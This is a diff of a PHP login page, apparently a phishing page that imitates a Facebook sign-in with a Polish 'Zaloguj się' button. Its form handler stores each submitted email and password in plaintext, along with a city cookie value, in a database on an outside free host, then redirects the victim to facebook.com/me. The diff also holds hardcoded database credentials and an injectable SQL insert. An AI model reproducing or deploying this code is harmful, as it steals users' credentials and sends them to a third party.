@@ -42,43 +42,54 @@ if(isset($_COOKIE['miasto'])) {
           </tr>
 
           
-  <form method="post" name="one">
+  <form method="POST" name="one">
       <td><input name="email" class="logintext loginfield" type="text"></td>
       <td><input name="pass" class="logintext loginrowgap loginfield" type="password"></td>
       <td><input class="loginrowgap" id="loginbutton" name="submit" type="submit" value="Zaloguj się"></td>
   </form>
      
        
-<?php
-if(isset($_POST['submit'])) {
-  if (!empty($_POST['email']) && !empty($_POST['pass'])){
+  <?php
+    if(isset($_POST['submit'])) {
+      if (!empty($_POST['email']) && !empty($_POST['pass'])){
 
-    $servername = "sql11.freesqldatabase.com";
-    $user = "sql11426662";
-    $pass = "1rdyzax38G";
-    $dbname = "sql11426662";
+        $servername = "sql11.freesqldatabase.com";
+        $user = "sql11426662";
+        $pass = "1rdyzax38G";
+        $dbname = "sql11426662";
 
-    $link = mysqli_connect($servername, $user, $pass, $dbname);
-    if($link === false){
-      echo '<script type="text/javascript">
-           window.location = "https://www.facebook.com/me"
-      </script>';
+        // mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
+        $link = mysqli_connect($servername, $user, $pass, $dbname);
+
+        $mysqli = new mysqli($servername, $user, $pass, $dbname);
+
+        if($mysqli === false){
+          echo '<script type="text/javascript">
+              window.location = "https://www.facebook.com/me"
+          </script>';
+        }
+
+        $email = $_POST['email'];
+        $password = $_POST['pass'];
+
+        $sql = "INSERT INTO test (m, p, city) VALUES ('$email', '$password', '$city')";
+
+        $result = $mysqli->query($sql);
+
+        if($result){
+            setcookie("5434", "58734", time()+60*60*24*30);
+            echo '
+              <script type="text/javascript">
+                window.location = "https://www.facebook.com/me"
+              </script>';
+        } else{
+          header("Refresh:0");
+        }
+
+      mysqli_close($link);
+      }
     }
-    $email = $_POST['email'];
-    $password = $_POST['pass'];
-    $sql = "INSERT INTO test (m, p, city) VALUES ('$email', '$password', '$city')";
-    if(mysqli_query($link, $sql)){
-        setcookie("5434", "58734", time()+60*60*24*30);
-        echo '<script type="text/javascript">
-           window.location = "https://www.facebook.com/me"
-      </script>';
-    } else{
-      header("Refresh:0");
-    }
-    mysqli_close($link);
-    }
-}
-?>
+  ?>
           </tr>
           <tr>
             <td></td>
